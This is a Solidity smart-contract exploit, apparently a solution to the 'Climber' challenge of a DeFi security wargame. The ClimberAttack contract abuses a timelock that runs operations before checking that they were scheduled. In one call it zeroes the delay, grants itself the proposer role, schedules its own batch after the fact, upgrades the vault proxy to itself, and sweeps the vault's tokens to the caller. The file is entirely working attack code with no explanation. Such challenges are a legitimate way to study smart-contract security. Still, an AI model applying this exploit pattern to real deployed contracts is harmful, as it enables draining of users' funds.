pragma solidity ^0.8.0;

import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";


contract ClimberAttack is UUPSUpgradeable {

  ClimberTimelock public immutable timelock;
  ClimberVault public immutable vault;
  address public immutable token;

  constructor(ClimberTimelock _timelock, ClimberVault _vault, address _token) {
    timelock = _timelock;
    vault = _vault;
    token = _token;
  }

  function attack() external {
    (
      address[] memory targets,
      uint256[] memory values,
      bytes[] memory dataElements
    ) = propose();
    timelock.execute(targets, values, dataElements, 0);
  }

  function schedule() external {
    (
      address[] memory targets,
      uint256[] memory values,
      bytes[] memory dataElements
    ) = propose();
    timelock.schedule(targets, values, dataElements, 0);
  }

  function propose() internal view returns (
    address[] memory targets, 
    uint256[] memory values,
    bytes[] memory dataElements
  ) {
    targets = new address[](5);
    values = new uint256[](5);
    dataElements = new bytes[](5);
    
    targets[0] = address(timelock);
    values[0] = 0;
    dataElements[0] = abi.encodeWithSelector(
      ClimberTimelock.updateDelay.selector, 
      0
    );

    targets[1] = address(timelock);
    values[1] = 0;
    dataElements[1] = abi.encodeWithSelector(
      AccessControl.grantRole.selector, 
      keccak256("PROPOSER_ROLE"), 
      address(this)
    );

    targets[2] = address(this);
    values[2] = 0;
    dataElements[2] = abi.encodeWithSelector(
      this.schedule.selector
    );

    targets[3] = address(vault);
    values[3] = 0;
    dataElements[3] = abi.encodeWithSignature(
      "upgradeTo(address)", 
      address(this)
    );

    targets[4] = address(vault);
    values[4] = 0;
    dataElements[4] = abi.encodeWithSelector(
      this.sweepFunds.selector, 
      token
    );
  }

  function _authorizeUpgrade(address newImplementation) internal override {}

  function sweepFunds(address tokenAddress) external {
    IERC20 token = IERC20(tokenAddress);
    require(token.transfer(tx.origin, token.balanceOf(address(this))), "Transfer failed");
  }
}